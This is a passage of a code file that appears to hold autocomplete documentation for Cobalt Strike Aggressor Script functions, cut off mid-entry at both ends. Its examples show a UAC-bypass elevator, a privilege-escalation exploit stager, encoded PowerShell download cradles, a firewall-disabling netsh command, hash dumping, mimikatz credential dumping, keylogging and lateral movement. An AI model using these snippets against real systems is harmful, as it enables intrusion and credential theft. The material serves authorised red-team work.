**Returns:** A string description of the Beacon command elevator

**Example:**
\`\`\`
println(beacon_elevator_describe("uac-token-duplication"));

See Also

&beacon_elevator_register, &beacon_elevators, &belevate_command
\`\`\``,
    anchors: ["beacon_elevator_describe"],
  },
  "beacon_elevator_register": {
    name: "beacon_elevator_register",
    detail: "beacon_elevator_register($1, $2, $3)",
    documentation: `Register a Beacon command elevator with Cobalt Strike. This adds an option to the runasadmin command.

**Arguments:**
- \`$1\` — the exploit short name
- \`$2\` — a description of the exploit
- \`$3\` — the function that implements the exploit ($1 is the Beacon ID, $2 the command and arguments)

**Example:**
\`\`\`
# Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack
# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
sub schtasks_elevator {
local('$handle $script $oneliner $command');

# acknowledge this command
btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");

# read in the script
$handle = openf(getFileProper(script_resource("modules"), "Invoke-EnvBypass.ps1"));
$script = readb($handle, -1);
closef($handle);

# host the script in Beacon
$oneliner = beacon_host_script($1, $script);

# base64 encode the command
$co
\`\`\``,
    anchors: ["beacon_elevator_register"],
  },
  "beacon_elevators": {
    name: "beacon_elevators",
    detail: "Get a list of command elevator exploits registered with Cobalt Strike",
    documentation: `Get a list of command elevator exploits registered with Cobalt Strike.

**Returns:** An array of Beacon command elevators

**Example:**
\`\`\`
printAll(beacon_elevators());

See also

&beacon_elevator_describe, &beacon_elevator_register, &belevate_command
\`\`\``,
    anchors: ["beacon_elevators"],
  },
  "beacon_execute_job": {
    name: "beacon_execute_job",
    detail: "beacon_execute_job($1, $2, $3, $4)",
    documentation: `Run a command and report its output to the user.

**Arguments:**
- \`$1\` — the Beacon ID
- \`$2\` — the command to run (environment variables are resolved)
- \`$3\` — the command arguments (environment variables are not resolved).
- \`$4\` — flags that change how the job is launched (e.g., 1 = disable WOW64 file system redirection)

**Note:** - The string $2 and $3 are combined as-is into a command line. Make sure you begin $3 with a space!

- This is the mechanism Cobalt Strike uses for its shell and powershell commands.

**Example:**
\`\`\`
alias shell {
local('$args');
$args = substr($0, 6);
btask($1, "Tasked beacon to run: $args", "T1059");
beacon_execute_job($1, "%COMSPEC%", " /C $args", 0);
}
\`\`\``,
    anchors: ["beacon_execute_job"],
  },
  "beacon_execute_postex_job": {
    name: "beacon_execute_postex_job",
    detail: "beacon_execute_postex_job($1, $2, $3, $4, $5, $6)",
    documentation: `Execute a user defined post exploitation task.

**Arguments:**
- \`$1\` — the Beacon ID
- \`$2\` — the PID to inject the task or $null for using fork&run
- \`$3\` — a string containing the postex DLL
- \`$4\` — (optional) packed arguments to pass to the postex task
- \`$5\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map
- \`$6\` — (optional) the message id type for the postex task. Defaults to CALLBACK_POSTEX_KIT`,
    anchors: ["beacon_execute_postex_job"],
  },
  "beacon_exploit_describe": {
    name: "beacon_exploit_describe",
    detail: "beacon_exploit_describe($1)",
    documentation: `Describe a Beacon exploit

**Arguments:**
- \`$1\` — the exploit

**Returns:** A string description of the Beacon exploit

**Example:**
\`\`\`
println(beacon_exploit_describe("ms14-058"));

See Also

&beacon_exploit_register, &beacon_exploits, &belevate
\`\`\``,
    anchors: ["beacon_exploit_describe"],
  },
  "beacon_exploit_register": {
    name: "beacon_exploit_register",
    detail: "beacon_exploit_register($1, $2, $3)",
    documentation: `Register a Beacon privilege escalation exploit with Cobalt Strike. This adds an option to the elevate command.

**Arguments:**
- \`$1\` — the exploit short name
- \`$2\` — a description of the exploit
- \`$3\` — the function that implements the exploit ($1 is the Beacon ID, $2 is the listener)

**Example:**
\`\`\`
# Integrate windows/local/ms16_016_webdav from Metasploit
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb

sub ms16_016_exploit {
local('$stager');

# check if we're on an x64 system and error out.
if (-is64 $1) {
berror($1, "ms16-016 exploit is x86 only");
return;
}

# acknowledge this command
btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016", "T1068");

# generate our shellcode
$stager = payload($2, "x86");

# spawn a Beacon post-ex job with the exploit DLL
bdllspawn!($1, getFileProper(script_resource("mod
\`\`\``,
    anchors: ["beacon_exploit_register"],
  },
  "beacon_exploits": {
    name: "beacon_exploits",
    detail: "Get a list of privilege escalation exploits registered with Cobalt Strike",
    documentation: `Get a list of privilege escalation exploits registered with Cobalt Strike.

**Returns:** An array of Beacon exploits.

**Example:**
\`\`\`
printAll(beacon_exploits());

See also

&beacon_exploit_describe, &beacon_exploit_register, &belevate
\`\`\``,
    anchors: ["beacon_exploits"],
  },
  "beacon_host_imported_script": {
    name: "beacon_host_imported_script",
    detail: "beacon_host_imported_script($1)",
    documentation: `Locally host a previously imported PowerShell script within Beacon and return a short script that will download and invoke this script.

**Arguments:**
- \`$1\` — the id of the Beacon to host this script with.

**Returns:** A short PowerShell script to download and evaluate the previously script when run. How this one-liner is used is up to you!

**Example:**
\`\`\`
alias powershell {
local('$args $cradle $runme $cmd');

# $0 is the entire command with no parsing.
$args = substr($0, 11);

# generate the download cradle (if one exists) for an imported PowerShell script
$cradle = beacon_host_imported_script($1);

# encode our download cradle AND cmdlet+args we want to run
$runme = base64_encode( str_encode($cradle . $args, "UTF-16LE") );

# Build up our entire command line.
$cmd = " -nop -exec bypass -EncodedCommand \\" $+ $runme $+ \\"";

# task Beacon to run all of this.
btask($1, "Tasked beacon to run: $args", "T1086");
beacon_execute_job($1, "powershell",
\`\`\``,
    anchors: ["beacon_host_imported_script"],
  },
  "beacon_host_script": {
    name: "beacon_host_script",
    detail: "beacon_host_script($1, $2)",
    documentation: `Locally host a PowerShell script within Beacon and return a short script that will download and invoke this script. This function is a way to run large scripts when there are constraints on the length of your PowerShell one-liner.

**Arguments:**
- \`$1\` — the id of the Beacon to host this script with.
- \`$2\` — the script data to host.

**Returns:** A short PowerShell script to download and evaluate the script when run. How this one-liner is used is up to you!

**Example:**
\`\`\`
alias test {
local('$script $hosted');
$script = "2 + 2";
$hosted = beacon_host_script($1, $script);

binput($1, "powerpick $hosted");
bpowerpick($1, $hosted);
}
\`\`\``,
    anchors: ["beacon_host_script"],
  },
  "beacon_ids": {
    name: "beacon_ids",
    detail: "Get the ID of all Beacons calling back to this Cobalt Strike team server",
    documentation: `Get the ID of all Beacons calling back to this Cobalt Strike team server.

**Returns:** An array of beacon IDs

**Example:**
\`\`\`
foreach $bid (beacon_ids()) {
println("Bid: $bid");
}
\`\`\``,
    anchors: ["beacon_ids"],
  },
  "beacon_info": {
    name: "beacon_info",
    detail: "beacon_info($1, $2)",
    documentation: `Get information from a Beacon session's metadata.

**Arguments:**
- \`$1\` — the id for the beacon to pull metadata for
- \`$2\` — the key to extract

**Returns:** A string with the requested information.

**Example:**
\`\`\`
println("User is: " . beacon_info("1234", "user"));
println("PID is: " . beacon_info("1234", "pid"));
\`\`\``,
    anchors: ["beacon_info"],
  },
  "beacon_inline_execute": {
    name: "beacon_inline_execute",
    detail: "beacon_inline_execute($1, $2, $3, $4, $5)",
    documentation: `Execute a Beacon Object File

**Arguments:**
- \`$1\` — the id for the Beacon
- \`$2\` — a string containing the BOF file
- \`$3\` — the entry point to call
- \`$4\` — packed arguments to pass to the BOF file
- \`$5\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Note:** The Cobalt Strike documentation has a page specific to BOF files. See Beacon Object Files.

Example (hello.c)
/*
* Compile with:
* x86_64-w64-mingw32-gcc -c hello.c -o hello.x64.o
* i686-w64-mingw32-gcc -c hello.c -o hello.x86.o
*/

#include "windows.h"
#include "stdio.h"
#include "tlhelp32.h"
#incl`,
    anchors: ["beacon_inline_execute"],
  },
  "beacon_job_hide_output": {
    name: "beacon_job_hide_output",
    detail: "beacon_job_hide_output($1, $2, $3)",
    documentation: `Hide or show the output of a specific job in Beacon console.

**Arguments:**
- \`$1\` — the Beacon id
- \`$2\` — the Job id
- \`$3\` — 1 for hide, 0 for show

**Example:**
\`\`\`
beacon_job_hide_output($bid, $jid, 1); # Hide the output
beacon_job_hide_output($bid, $jid, 0); # Show the output
\`\`\``,
    anchors: ["beacon_job_hide_output"],
  },
  "beacon_job_name": {
    name: "beacon_job_name",
    detail: "beacon_job_name($1, $2, $3)",
    documentation: `Set the name for a specific job entry.

**Arguments:**
- \`$1\` — the Beacon id
- \`$2\` — the Job id
- \`$3\` — the new job name`,
    anchors: ["beacon_job_name"],
  },
  "beacon_link": {
    name: "beacon_link",
    detail: "beacon_link($1, $2, $3)",
    documentation: `This function links to an SMB or TCP listener. If the specified listener is not an SMB or TCP listener, this function does nothing.

**Arguments:**
- \`$1\` — the id of the beacon to link through
- \`$2\` — the target host to link to. Use $null for localhost.
- \`$3\` — the listener to link

**Example:**
\`\`\`
# smartlink [target] [listener name]
alias smartlink {
beacon_link($1, $2, $3);
}
\`\`\``,
    anchors: ["beacon_link"],
  },
  "beacon_remote_exec_method_describe": {
    name: "beacon_remote_exec_method_describe",
    detail: "beacon_remote_exec_method_describe($1)",
    documentation: `Describe a Beacon remote execute method

**Arguments:**
- \`$1\` — the method

**Returns:** A string description of the Beacon remote execute method.

**Example:**
\`\`\`
println(beacon_remote_exec_method_describe("wmi"));

See also

&beacon_remote_exec_method_register, &beacon_remote_exec_methods, &bremote_exec
\`\`\``,
    anchors: ["beacon_remote_exec_method_describe"],
  },
  "beacon_remote_exec_method_register": {
    name: "beacon_remote_exec_method_register",
    detail: "beacon_remote_exec_method_register($1, $2, $3)",
    documentation: `Register a Beacon remote execute method with Cobalt Strike. This adds an option for use with the remote-exec command.

**Arguments:**
- \`$1\` — the method short name
- \`$2\` — a description of the method
- \`$3\` — the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the command+args)`,
    anchors: ["beacon_remote_exec_method_register"],
  },
  "beacon_remote_exec_methods": {
    name: "beacon_remote_exec_methods",
    detail: "Get a list of remote execute methods registered with Cobalt Strike",
    documentation: `Get a list of remote execute methods registered with Cobalt Strike.

**Returns:** An array of remote exec modules.

**Example:**
\`\`\`
printAll(beacon_remote_exec_methods());

See also

&beacon_remote_exec_method_describe, &beacon_remote_exec_method_register, &bremote_exec
\`\`\``,
    anchors: ["beacon_remote_exec_methods"],
  },
  "beacon_remote_exploit_arch": {
    name: "beacon_remote_exploit_arch",
    detail: "beacon_remote_exploit_arch($1)",
    documentation: `Get the arch info for this Beacon lateral movement option.

**Arguments:**
- \`$1\` — the exploit

**Returns:** x86 or x64

**Example:**
\`\`\`
println(beacon_remote_exploit_arch("psexec"));

See Also

&beacon_remote_exploit_register, &beacon_remote_exploits, &bjump
\`\`\``,
    anchors: ["beacon_remote_exploit_arch"],
  },
  "beacon_remote_exploit_describe": {
    name: "beacon_remote_exploit_describe",
    detail: "beacon_remote_exploit_describe($1)",
    documentation: `Describe a Beacon lateral movement option.

**Arguments:**
- \`$1\` — the exploit

**Returns:** A string description of the Beacon lateral movement option.

**Example:**
\`\`\`
println(beacon_remote_exploit_describe("psexec"));

See Also

&beacon_remote_exploit_register, &beacon_remote_exploits, &bjump
\`\`\``,
    anchors: ["beacon_remote_exploit_describe"],
  },
  "beacon_remote_exploit_register": {
    name: "beacon_remote_exploit_register",
    detail: "beacon_remote_exploit_register($1, $2, $3, $4)",
    documentation: `Register a Beacon lateral movement option with Cobalt Strike. This function extends the jump command.

**Arguments:**
- \`$1\` — the exploit short name
- \`$2\` — the arch associated with this attack (e.g., x86, x64)
- \`$3\` — a description of the exploit
- \`$4\` — the function that implements the exploit ($1 is the Beacon ID, $2 is the target, $3 is the listener)`,
    anchors: ["beacon_remote_exploit_register"],
  },
  "beacon_remote_exploits": {
    name: "beacon_remote_exploits",
    detail: "Get a list of lateral movement options registered with Cobalt Strike",
    documentation: `Get a list of lateral movement options registered with Cobalt Strike.

**Returns:** An array of lateral movement option names.

**Example:**
\`\`\`
printAll(beacon_remote_exploits());

See also

&beacon_remote_exploit_describe, &beacon_remote_exploit_register, &bjump
\`\`\``,
    anchors: ["beacon_remote_exploits"],
  },
  "beacon_remove": {
    name: "beacon_remove",
    detail: "beacon_remove($1)",
    documentation: `Remove a Beacon from the display.

**Arguments:**
- \`$1\` — the id for the beacon to remove`,
    anchors: ["beacon_remove"],
  },
  "beacon_stage_pipe": {
    name: "beacon_stage_pipe",
    detail: "beacon_stage_pipe($1, $2, $3, $4)",
    documentation: `This function handles the staging process for a bind pipe stager. This is an optional stager for lateral movement. You can stage any x86 payload/listener through this stager. Use &stager_bind_pipe to generate this stager.

**Arguments:**
- \`$1\` — the id of the beacon to stage through
- \`$2\` — the target host
- \`$3\` — the listener name
- \`$4\` — the architecture of the payload to stage. x86 is the only option right now.

**Example:**
\`\`\`
# step 1. generate our stager
$stager = stager_bind_pipe("my-listener");

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_pipe($bid, $target, "my-listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my-listener");
\`\`\``,
    anchors: ["beacon_stage_pipe"],
  },
  "beacon_stage_tcp": {
    name: "beacon_stage_tcp",
    detail: "beacon_stage_tcp($1, $2, $3, $4, $5)",
    documentation: `This function handles the staging process for a bind TCP stager. This is the preferred stager for localhost-only staging. You can stage any payload/listener through this stager. Use &stager_bind_tcp to generate this stager.

**Arguments:**
- \`$1\` — the id of the beacon to stage through
- \`$2\` — reserved; use $null for now.
- \`$3\` — the port to stage to
- \`$4\` — the listener name
- \`$5\` — the architecture of the payload to stage (x86, x64)

**Example:**
\`\`\`
# step 1. generate our stager
$stager = stager_bind_tcp("my-listener", "x86", 1234);

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_tcp($bid, $target, 1234, "my-listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my-listener");
\`\`\``,
    anchors: ["beacon_stage_tcp"],
  },
  "beacons": {
    name: "beacons",
    detail: "Get information about all Beacons calling back to this Cobalt Strike team server",
    documentation: `Get information about all Beacons calling back to this Cobalt Strike team server.

**Returns:** An array of dictionary objects with information about each beacon.

**Example:**
\`\`\`
foreach $beacon (beacons()) {
println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
}
\`\`\``,
    anchors: ["beacons"],
  },
  "belevate": {
    name: "belevate",
    detail: "belevate($1, $2, $3)",
    documentation: `Ask Beacon to spawn an elevated session with a registered technique.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the exploit to fire
- \`$3\` — the listener to target.

**Example:**
\`\`\`
item "&Elevate 31337" {
openPayloadHelper(lambda({
binput($bids, "elevate ms14-058 $1");
belevate($bids, "ms14-058", $1);
}, $bids => $1));
}

See also

&beacon_exploit_describe, &beacon_exploit_register, &beacon_exploits
\`\`\``,
    anchors: ["belevate"],
  },
  "belevate_command": {
    name: "belevate_command",
    detail: "belevate_command($1, $2, $3)",
    documentation: `Ask Beacon to run a command in a high-integrity context

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the module/command elevator to use
- \`$3\` — the command and its arguments.

**Example:**
\`\`\`
# disable the firewall
alias shieldsdn {
belevate_command($1, "uac-token-duplication", "cmd.exe /C netsh advfirewall set allprofiles state off");
}

See also

&beacon_elevator_describe, &beacon_elevator_register, &beacon_elevators
\`\`\``,
    anchors: ["belevate_command"],
  },
  "berror": {
    name: "berror",
    detail: "berror($1, $2)",
    documentation: `Publish an error message to the Beacon transcript

**Arguments:**
- \`$1\` — the id for the beacon to post to
- \`$2\` — the text to post

**Example:**
\`\`\`
alias donotrun {
berror($1, "You should never run this command!");
}
\`\`\``,
    anchors: ["berror"],
  },
  "bexecute": {
    name: "bexecute",
    detail: "bexecute($1, $2)",
    documentation: `Ask Beacon to execute a command [without a shell]. This provides no output to the user.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command and arguments to run

**Example:**
\`\`\`
bexecute($1, "notepad.exe");
\`\`\``,
    anchors: ["bexecute"],
  },
  "bexecute_assembly": {
    name: "bexecute_assembly",
    detail: "bexecute_assembly($1, $2, $3, $4, $5)",
    documentation: `Spawns a local .NET executable assembly as a Beacon post-exploitation job.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the local path to the .NET executable assembly
- \`$3\` — parameters to pass to the assembly
- \`$4\` — (optional) the "PATCHES:" argument can modify functions in memory for the process. Up to 4 "patch-rule" rules can be specified (space delimited).
- \`$5\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Note:** - This command accepts a valid .NET executable and calls its entry point. 

- This post-exploitation job inherits Beacon's thread token.

- Compile your custom .NET programs with a .NET 3.5 compiler for compatibility with systems that don't have .NET 4.0 and later.

**Example:**
\`\`\`
alias myutil {
bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \\"arg 3\\"");
}
\`\`\``,
    anchors: ["bexecute_assembly"],
  },
  "bexit": {
    name: "bexit",
    detail: "bexit($1)",
    documentation: `Ask a Beacon to exit.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
item "&Die" {
binput($1, "exit");
bexit($1);
}
\`\`\``,
    anchors: ["bexit"],
  },
  "bgetprivs": {
    name: "bgetprivs",
    detail: "bgetprivs($1, $2)",
    documentation: `Attempts to enable the specified privilege in your Beacon session.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — a comma-separated list of privileges to enable. See:

**Example:**
\`\`\`
alias debug {
bgetprivs($1, "SeDebugPriv");
}
\`\`\``,
    anchors: ["bgetprivs"],
  },
  "bgetsystem": {
    name: "bgetsystem",
    detail: "bgetsystem($1)",
    documentation: `Ask Beacon to attempt to get the SYSTEM token.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
item "Get &SYSTEM" {
binput($1, "getsystem");
bgetsystem($1);
}
\`\`\``,
    anchors: ["bgetsystem"],
  },
  "bgetuid": {
    name: "bgetuid",
    detail: "bgetuid($1)",
    documentation: `Ask Beacon to print the User ID of the current token

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.`,
    anchors: ["bgetuid"],
  },
  "bhashdump": {
    name: "bhashdump",
    detail: "bhashdump($1, $2, $3, $4)",
    documentation: `Ask Beacon to dump local account password hashes. If injecting into a pid that process requires administrator privileges.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID to inject the hashdump dll into or $null.
- \`$3\` — (optional) the architecture of the target PID (x86|x64) or $null.
- \`$4\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map.

**Example:**
\`\`\`
Spawn a temporary process
item "Dump &Hashes" {
binput($1, "hashdump");
bhashdump($1);
}

Inject into the specified process)
bhashdump($1, 1234, "x64");
\`\`\``,
    anchors: ["bhashdump"],
  },
  "bind": {
    name: "bind",
    detail: "bind($1, $2)",
    documentation: `Bind a keyboard shortcut to an Aggressor Script function. This is an alternate to the bind keyword.

**Arguments:**
- \`$1\` — the keyboard shortcut
- \`$2\` — a callback function. Called when the event happens.

**Example:**
\`\`\`
# bind Ctrl+Left and Ctrl+Right to cycle through previous and next tab.

bind("Ctrl+Left", {
previousTab();
});

bind("Ctrl+Right", {
nextTab();
});

See also

&unbind
\`\`\``,
    anchors: ["bind"],
  },
  "binfo": {
    name: "binfo",
    detail: "binfo($1, $2)",
    documentation: `Get information from a Beacon session's metadata.

**Arguments:**
- \`$1\` — the id for the beacon to pull metadata for
- \`$2\` — the key to extract

**Returns:** A string with the requested information.

**Example:**
\`\`\`
println("User is: " . binfo("1234", "user"));
println("PID is: " . binfo("1234", "pid"));
\`\`\``,
    anchors: ["binfo"],
  },
  "binject": {
    name: "binject",
    detail: "binject($1, $2, $3, $4)",
    documentation: `Ask Beacon to inject a session into a specific process.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the process to inject the session into
- \`$3\` — the listener to target.
- \`$4\` — the process architecture (x86 | x64)

**Example:**
\`\`\`
binject($1, 1234, "my-listener");
\`\`\``,
    anchors: ["binject"],
  },
  "binline_execute": {
    name: "binline_execute",
    detail: "binline_execute($1, $2, $3, $4)",
    documentation: `Execute a Beacon Object File. This is the same as using the inline-execute command in Beacon.

**Arguments:**
- \`$1\` — the id for the Beacon
- \`$2\` — the path to the BOF file
- \`$3\` — the string argument to pass to the BOF file
- \`$4\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Note:** This functions follows the behavior of *inline-execute* in the Beacon console. The string argument will be zero-terminated, converted to the target encoding, and passed as an argument to the BOF's go function. To execute a BOF, with more control, use &beacon_inline_execute

The Cobalt Strike documen`,
    anchors: ["binline_execute"],
  },
  "binput": {
    name: "binput",
    detail: "binput($1, $2)",
    documentation: `Report a command was run to the Beacon console and logs. Scripts that execute commands for the user (e.g., events, popup menus) should use this function to assure operator attribution of automated actions in Beacon's logs.

**Arguments:**
- \`$1\` — the id for the beacon to post to
- \`$2\` — the text to post

**Example:**
\`\`\`
# indicate the user ran the ls command
binput($1, "ls");
\`\`\``,
    anchors: ["binput"],
  },
  "bipconfig": {
    name: "bipconfig",
    detail: "bipconfig($1, $2)",
    documentation: `Task a Beacon to list network interfaces.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — callback function with the ipconfig results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Example:**
\`\`\`
alias ipconfig {
bipconfig($1, {
blog($1, "Network information is:\\n $+ $2");
});
}
\`\`\``,
    anchors: ["bipconfig"],
  },
  "bjob_send_data": {
    name: "bjob_send_data",
    detail: "bjob_send_data($1, $2, $3)",
    documentation: `Sends data to the DLL over the named pipe. 

NOTE: The Postex Kit DLL must read any data on the pipe before Beacon can write any additional data to it. See Bi-Directional Comms and Callbacks for examples.

**Arguments:**
- \`$1\` — the Beacon id
- \`$2\` — the Job id
- \`$3\` — the data to send

**Example:**
\`\`\`
bjob_send_data($beacon_id, $job_id, $data);
\`\`\``,
    anchors: ["bjob_send_data"],
  },
  "bjoberror": {
    name: "bjoberror",
    detail: "Publishes a job error message to the Beacon transcript",
    documentation: `Publishes a job error message to the Beacon transcript. Its primary purpose is to be used in the post-execution job's callback function.

Arguments:

$1 - the id for the beacon to post to.

$2 - the related job id.

$3 - the test to post.

Example:
beacon_execute_postex_job($bid, $null, $dll_content, $args, {
local('$bid $result %info $type');
($bid, $result, %info) = @_;
$type = %info["type"] ;
$jid = %info["jid"] ;
if ($type eq "error") {
bjoberror($bid, $jid, "[postex-cb: $+ $type $+ ]: " . $result);
}
else {
bjoblog($bid, $jid, "[postex-cb: $+ $type $+ ]: " . $result);
}
});`,
    anchors: ["bjoberror"],
  },
  "bjobkill": {
    name: "bjobkill",
    detail: "bjobkill($1, $2)",
    documentation: `Ask Beacon to kill a running post-exploitation job.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the job ID.

**Example:**
\`\`\`
bjobkill($1, 0);
\`\`\``,
    anchors: ["bjobkill"],
  },
  "bjoblog": {
    name: "bjoblog",
    detail: "Publishes a job output message to the Beacon transcript",
    documentation: `Publishes a job output message to the Beacon transcript. Its primary purpose is to be used in the post-execution job's callback function.

Arguments:

$1 - the id for the beacon to post to.

$2 - the related job id.

$3 - the test to post.

Example:
beacon_execute_postex_job($bid, $null, $dll_content, $args, {
local('$bid $result %info $type');
($bid, $result, %info) = @_;
$type = %info["type"] ;
$jid = %info["jid"] ;
if ($type eq "error") {
bjoberror($bid, $jid, "[postex-cb: $+ $type $+ ]: " . $result);
}
else {
bjoblog($bid, $jid, "[postex-cb: $+ $type $+ ]: " . $result);
}
});`,
    anchors: ["bjoblog"],
  },
  "bjobs": {
    name: "bjobs",
    detail: "bjobs($1)",
    documentation: `Ask Beacon to list running post-exploitation jobs.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
bjobs($1);
\`\`\``,
    anchors: ["bjobs"],
  },
  "bjump": {
    name: "bjump",
    detail: "bjump($1, $2, $3, $4)",
    documentation: `Ask Beacon to spawn a session on a remote target.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the technique to use
- \`$3\` — the remote target
- \`$4\` — the listener to spawn

**Example:**
\`\`\`
# winrm [target] [listener]
alias winrm {
bjump($1, "winrm", $2, $3);
}

See also

&beacon_remote_exploit_describe, &beacon_remote_exploit_register, &beacon_remote_exploits
\`\`\``,
    anchors: ["bjump"],
  },
  "bkerberos_ccache_use": {
    name: "bkerberos_ccache_use",
    detail: "bkerberos_ccache_use($1, $2)",
    documentation: `Ask beacon to inject a UNIX kerberos ccache file into the user's kerberos tray

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the local path the ccache file

**Example:**
\`\`\`
alias kerberos_ccache_use {
bkerberos_ccache_use($1, $2);
}
\`\`\``,
    anchors: ["bkerberos_ccache_use"],
  },
  "bkerberos_ticket_purge": {
    name: "bkerberos_ticket_purge",
    detail: "bkerberos_ticket_purge($1)",
    documentation: `Ask beacon to purge tickets from the user's kerberos tray

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
alias kerberos_ticket_purge {
bkerberos_ticket_purge($1);
}
\`\`\``,
    anchors: ["bkerberos_ticket_purge"],
  },
  "bkerberos_ticket_use": {
    name: "bkerberos_ticket_use",
    detail: "bkerberos_ticket_use($1, $2)",
    documentation: `Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the local path the kirbi file

**Example:**
\`\`\`
alias kerberos_ticket_use {
bkerberos_ticket_use($1, $2);
}
\`\`\``,
    anchors: ["bkerberos_ticket_use"],
  },
  "bkeylogger": {
    name: "bkeylogger",
    detail: "bkeylogger($1, $2, $3)",
    documentation: `Injects a keystroke logger into a process.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — (optional) the PID to inject the keystroke logger into or $null.
- \`$3\` — (optional) the architecture of the target PID (x86|x64) or $null.

**Example:**
\`\`\`
Spawn a temporary process
bkeylogger($1);

Inject into the specified process
bkeylogger($1, 1234, "x64");
\`\`\``,
    anchors: ["bkeylogger"],
  },
  "bkill": {
    name: "bkill",
    detail: "bkill($1, $2)",
    documentation: `Ask Beacon to kill a process

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID to kill

**Example:**
\`\`\`
bkill($1, 1234);
\`\`\``,
    anchors: ["bkill"],
  },
  "blink": {
    name: "blink",
    detail: "blink($1, $2, $3)",
    documentation: `Ask Beacon to link to a host over a named pipe

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the target to link to
- \`$3\` — (optional) the pipename to use. The default pipename in the Malleable C2 profile is the default otherwise.

**Note:** Use &beacon_link if you want a script function that will connect or link based on a listener configuration.

**Example:**
\`\`\`
blink($1, "DC");
\`\`\``,
    anchors: ["blink"],
  },
  "blog": {
    name: "blog",
    detail: "blog($1, $2)",
    documentation: `Publishes an output message to the Beacon transcript.

**Arguments:**
- \`$1\` — the id for the beacon to post to
- \`$2\` — the text to post

**Example:**
\`\`\`
alias demo {
blog($1, "I am output for the blog function");
}
\`\`\``,
    anchors: ["blog"],
  },
  "blog2": {
    name: "blog2",
    detail: "blog2($1, $2)",
    documentation: `Publishes an output message to the Beacon transcript. This function has an alternate format from &blog

**Arguments:**
- \`$1\` — the id for the beacon to post to
- \`$2\` — the text to post

**Example:**
\`\`\`
alias demo2 {
blog2($1, "I am output for the blog2 function");
}
\`\`\``,
    anchors: ["blog2"],
  },
  "bloginuser": {
    name: "bloginuser",
    detail: "bloginuser($1, $2, $3, $4)",
    documentation: `Ask Beacon to create a token from the specified credentials. This is the make_token command. User principle name (UPN) formatting may be used for the username value. In this case, the user's domain value is ignored.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the domain of the user
- \`$3\` — the user's username
- \`$4\` — the user's password`,
    anchors: ["bloginuser"],
  },
  "blogonpasswords": {
    name: "blogonpasswords",
    detail: "blogonpasswords($1, $2, $3)",
    documentation: `Ask Beacon to dump in-memory credentials with mimikatz. This function requires administrator privileges.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — (optional) the PID to inject the logonpasswords command into or $null
- \`$3\` — (optional) the architecture of the target PID (x86|x64) or $null

**Example:**
\`\`\`
Spawn a temporary process
item "Dump &Passwords" {
binput($1, "logonpasswords");
blogonpasswords($1);
}

Inject into the specified process
beacon_command_register(
"logonpasswords_inject",
"Inject into a process and dump in-memory credentials with mimikatz",
"Usage: logonpasswords_inject [pid] [arch]");

alias logonpasswords_inject {
blogonpasswords($1, $2, $3);
}
\`\`\``,
    anchors: ["blogonpasswords"],
  },
  "bls": {
    name: "bls",
    detail: "bls($1, $2, $3)",
    documentation: `Task a Beacon to list files

Variations
bls($1, "folder");

Output the results to the Beacon console.

bls($1, "folder", &callback);

Route results to the specified callback function.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — (optional) the folder to list files for. Use "." for the current folder.
- \`$3\` — (optional) callback function with the ls results. Arguments to the callback are: $1 = beacon ID, $2 = the folder, $3 = results

**Example:**
\`\`\`
on beacon_initial {
bls($1, ".");
}
\`\`\``,
    anchors: ["bls"],
  },
  "bmimikatz": {
    name: "bmimikatz",
